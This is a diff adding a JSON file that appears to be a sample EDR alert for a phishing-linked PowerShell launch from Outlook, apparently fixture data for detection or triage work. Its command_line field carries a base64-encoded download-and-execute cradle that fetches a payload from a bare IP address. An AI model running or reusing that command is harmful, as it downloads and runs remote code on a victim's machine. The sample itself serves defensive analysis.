@@ -1,0 +1,18 @@
+{
+  "alert_id": "ALERT-2024-0115-001",
+  "source": "EDR",
+  "severity": "High",
+  "timestamp": "2024-01-15T14:28:05Z",
+  "title": "Suspicious PowerShell Execution Detected",
+  "host": "WORKSTATION-42",
+  "user": "CORP\\jsmith",
+  "summary": "PowerShell process detected with encoded command line parameters. Process spawned from outlook.exe which may indicate phishing-based initial access.",
+  "raw_event": {
+    "event_type": "ProcessCreate",
+    "process_name": "powershell.exe",
+    "process_id": 4780,
+    "parent_process": "outlook.exe",
+    "parent_pid": 3456,
+    "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMwAuADIAMgAzAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA"
+  }
+}
